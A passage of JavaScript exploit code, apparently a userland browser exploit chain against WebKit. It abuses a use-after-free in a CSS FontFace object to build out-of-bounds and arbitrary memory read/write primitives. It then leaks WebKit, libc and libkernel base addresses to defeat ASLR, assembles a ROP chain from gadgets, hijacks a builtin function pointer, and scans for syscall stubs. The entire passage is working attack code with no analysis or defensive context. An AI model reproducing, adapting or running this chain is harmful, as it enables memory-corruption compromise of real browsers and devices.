        logger.info(`Found FontFace marker at ${marker.hex()} !!`);

        const js_font_addr = rw.read8(marker + 0x20n);
        logger.debug(`js_font_addr: ${js_font_addr.hex()}`);

        const font_addr = rw.read8(js_font_addr + 0x18n);
        logger.debug(`font_addr: ${font_addr.hex()}`);

        const css_font_addr = rw.read8(font_addr + 0x28n);
        logger.debug(`css_font_addr: ${css_font_addr.hex()}`);

        m_thread = rw.read8(css_font_addr + 0xa8n);
        logger.debug(`m_thread: ${m_thread.hex()}`);

        found_ffs = true;
      }

      if (found && found_ffs) {
        break;
      }
    }

    if (found && found_ffs) {
      break;
    }

    start += 0x100n;
  }

  const oob_arr_indexing_header_before = rw.read8(oob_arr_indexing_header_addr);
  logger.debug(`oob_arr_indexing_header before: ${oob_arr_indexing_header_before.hex()}`);

  // Needed to survive crash from calling CSSFontFaceSet::add/CSSFontFaceSet::remove
  uaf_view.setUint8(Offsets.current.wk_CSSFontFace_m_status, 4); // m_status: Status::Failure

  document.fonts.add(rw.uaf_font);

  // Prepare UAF FontFace to be freed on CSSFontFaceSet::remove call, place oob_arr's indexing_header into m_families and m_wrapper so it deref by 1 then 2 and underflows
  uaf_view.setBigUint64(8, 1n, true); // ref count
  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_families, oob_arr_indexing_header_addr, true); // m_families
  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_featureSettings_m_buffer, 0n, true); // m_featureSettings.m_buffer
  uaf_view.setInt32(Offsets.current.wk_CSSFontFace_m_featureSettings_m_size, 0, true); // m_featureSettings.m_size
  uaf_view.setInt32(Offsets.current.wk_CSSFontFace_m_featureSettings_m_capacity, 0, true); // m_featureSettings.m_capacity
  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_clients, 0n, true); // m_clients
  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_wrapper, oob_arr_indexing_header_addr, true); // m_wrapper
  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_thread, m_thread, true); // m_thread

  document.fonts.delete(rw.uaf_font);

  // Restore UAF FontFace to be able to use rw.read again
  uaf_view.setBigUint64(8, 2n, true); // ref count
  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_clients, m_clients, true); // m_clients
  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_wrapper, m_wrapper, true); // m_wrapper
  uaf_view.setUint8(Offsets.current.wk_CSSFontFace_m_status, 3); // m_status: Status::Success

  const oob_arr_indexing_header_after = rw.read8(oob_arr_indexing_header_addr);
  logger.debug(`oob_arr_indexing_header after: ${oob_arr_indexing_header_after.hex()}`);

  if (oob_arr_indexing_header_before === oob_arr_indexing_header_after) {
    throw new Error("Unable to underflow oob_arr's indexing_header !!");
  }

  for (let i = 0; i < views.length; i += 3) {
    if (views[i].length === 0xffffffff) {
      logger.info(`Found oob_arr at views[${i}] !!`);
      rw.oob_arr = views[i];
      rw.obj_arr = views[i + 1];
      break;
    }
  }

  if (rw.oob_arr === undefined) {
    throw new Error("Unable to find oob_arr !!");
  }

  arw.leak_addr = rw.addrof(arw.leak);
  logger.debug(`leak_addr: ${arw.leak_addr.hex()}`);

  const dummy_view = new Uint32Array(1);
  const dummy_view_addr = rw.addrof(dummy_view);
  logger.debug(`dummy_view_addr: ${dummy_view_addr.hex()}`);

  const dummy_view_jscell = rw.read8(dummy_view_addr);
  logger.debug(`dummy_view_jscell: ${dummy_view_jscell.hex()}`);

  // Prepare container's properties to be used with fakeobj to create arw.master view over arw.victim DataView
  const container = {
    jscell: helper.to_float(dummy_view_jscell), // NaN-boxed, fix later
    butterfly: null, // becomes 0x2, fix later
    vector: arw.victim,
    length_and_flags: false, // becomes 0x6, fix later
  };

  const container_addr = rw.addrof(container);
  logger.debug(`container_addr: ${container_addr.hex()}`);

  const fake_addr = container_addr + 0x10n;
  logger.debug(`fake_addr: ${fake_addr.hex()}`);

  const fake = rw.fakeobj(fake_addr);

  // Set victim's vector to fake_addr
  fake[4] = Number(fake_addr.lo());
  fake[5] = Number(fake_addr.htol());

  // Fix NaN-boxing values from earlier
  arw.victim.setBigUint64(0, dummy_view_jscell, true); // jscell
  arw.victim.setBigUint64(8, 0n, true); // butterfly
  arw.victim.setUint32(0x1c, 1, true); // TypedArrayMode::OversizeTypedArray

  // Create new view as TypedArrayMode::WastefulTypedArray using fake.buffer that points to arw.victim and no longer depends on container's lifetime
  arw.master = new Uint32Array(fake.buffer);

  const victim_addr = arw.addrof(arw.victim);
  logger.debug(`victim_addr: ${victim_addr.hex()}`);

  // Set arw.victim's length to max
  arw.view(victim_addr).setInt32(0x18, -1, true);

  // Cleanup container
  //delete container.jscell; // FIXME: crashes, need to figure out why
  delete container.butterfly;
  delete container.vector;
  delete container.length_and_flags;

  logger.info("Achieved ARW !!");
}

function init_aslr() {
  logger.info("Initiate ASLR...");

  const math_expm1_addr = arw.addrof(Math.expm1);
  logger.debug(`math_expm1_addr: ${math_expm1_addr.hex()}`);

  m_executableOrRareData = arw.view(math_expm1_addr).getBigUint64(0x18, true);
  logger.debug(`m_executableOrRareData: ${m_executableOrRareData.hex()}`);

  const m_function = arw.view(m_executableOrRareData).getBigUint64(0x28, true);
  logger.debug(`m_function: ${m_function.hex()}`);

  const m_constructor = arw.view(m_executableOrRareData).getBigUint64(0x30, true);
  logger.debug(`m_constructor: ${m_constructor.hex()}`);

  webkit_base = m_function - Offsets.current.wk_expm1_builtin;
  logger.info(`webkit base: ${webkit_base.hex()}`);

  strerror_addr = arw.view(webkit_base).getBigUint64(Offsets.current.wk___imp_strerror, true);
  logger.debug(`strerror_addr: ${strerror_addr.hex()}`);

  libc_base = strerror_addr - Offsets.current.c_strerror;
  logger.info(`libc base: ${libc_base.hex()}`);

  _error_addr = arw.view(webkit_base).getBigUint64(Offsets.current.wk___imp___error, true);
  logger.debug(`_error_addr: ${_error_addr.hex()}`);

  libkernel_base = _error_addr - Offsets.current.k__error;
  logger.info(`libkernel base: ${libkernel_base.hex()}`);

  logger.info("Achieved ASLR...");
}

function init_rop() {
  logger.info("Initiate ROP...");

  rop.pivot = new Pivot();
  rop.stack = new Stack(0x2000);
  rop.frame = new Frame(["rsp", "rax", "rip", "rdi", "rsi", "rdx", "rcx", "r8", "r9"]);

  rop.insts.push(gadgets.PUSH_RBP_POP_RAX_RET);
  rop.insts.push(gadgets.MOV_RAX_RCX_RET);

  rop.frame.store(rop.insts, "rsp");

  rop.insts.push(gadgets.POP_RAX_RET);
  rop.frame.valueof(rop.insts, "rax");

  rop.insts.push(gadgets.POP_RDI_RET);
  rop.frame.valueof(rop.insts, "rdi");

  rop.insts.push(gadgets.POP_RSI_RET);
  rop.frame.valueof(rop.insts, "rsi");

  rop.insts.push(gadgets.POP_RDX_RET);
  rop.frame.valueof(rop.insts, "rdx");

  rop.insts.push(gadgets.POP_RCX_RET);
  rop.frame.valueof(rop.insts, "rcx");

  rop.insts.push(gadgets.POP_R8_RET);
  rop.frame.valueof(rop.insts, "r8");

  rop.insts.push(gadgets.POP_R9_RET);
  rop.frame.valueof(rop.insts, "r9");

  rop.frame.valueof(rop.insts, "rip");

  rop.frame.store(rop.insts, "rax");
  rop.frame.load(rop.insts, "rsp");

  rop.insts.push(gadgets.PUSH_RAX_POP_RBP_RET);
  rop.insts.push(gadgets.POP_RAX_RET);
  rop.insts.push(0n);
  rop.insts.push(gadgets.LEAVE_RET);

  arw.view(m_executableOrRareData).setBigUint64(0x28, gadgets.MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_38, true);

  fn._error = new NativeFunction(_error_addr, "bigint");
  fn._strerror = new NativeFunction(strerror_addr, "string");

  logger.info("Achieved ROP !!");
}

function init_syscalls() {
  logger.info("Initiate SYSCALLS...");

  scan_syscalls(libkernel_base);

  // syscall functions
  fn.read = new NativeFunction(0x3, "bigint");
  fn.write = new NativeFunction(0x4, "bigint");
  fn.open = new NativeFunction(0x5, "number");
  fn.close = new NativeFunction(0x6, "number");
  fn.fstat = new NativeFunction(0xbd, "number");
  fn.sysctl = new NativeFunction(0xca, "number");
  fn.nanosleep = new NativeFunction(0xf0, "number");
  fn.socket = new NativeFunction(0x61, "number");
  fn.dlsym = new NativeFunction(0x24f, "number");
  fn.dup = new NativeFunction(0x29, "number");

  logger.info("Initiated SYSCALLS !!");
}

function scan_syscalls(base) {
  if (syscalls.size > 0) {
    logger.info(`Already found ${syscalls.size} syscalls !!`);
    return;
  }

  const size = 0x40000;
  const pattern = [0x48, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x49, 0x89, 0xca, 0x0f, 0x05];
  const pattern_end = pattern.length - 1;

  const u8 = new Uint8Array(ArrayBuffer.from(base, size));

  let i = 0;
  let match = 0;
  let offset = 0;
  while (offset < size) {
    const b = u8[offset];
    const c = pattern[i];

    if (b === c || c === 0xff) {
      if (i === 0) {
        match = offset;
      }

      i++;

      if (i === pattern_end) {
        const addr = base + BigInt(match);
        const id = arw.view(addr).getInt32(3, true);

        syscalls.set(id, addr);

        i = 0;
      }
    } else {
      i = 0;
    }

    offset++;
  }

  logger.info(`Found ${syscalls.size} syscalls !!`);
}
//#endregion
//#region Structs
function init_structs() {
  timespec = new Struct("timespec", [
    { type: "Int64", name: "tv_sec" },
    { type: "Int64", name: "tv_nsec" },
  ]);
}
//#endregion

export async function main() {
  try {
    logger.info("===USERLAND===");

    init_structs();
    await init_arw();
    init_aslr();
    init_rop();
    init_syscalls();

    logger.info("===END===");
  } catch (e) {
    logger.error(e.message);
    logger.error(e.stack);
  }
}
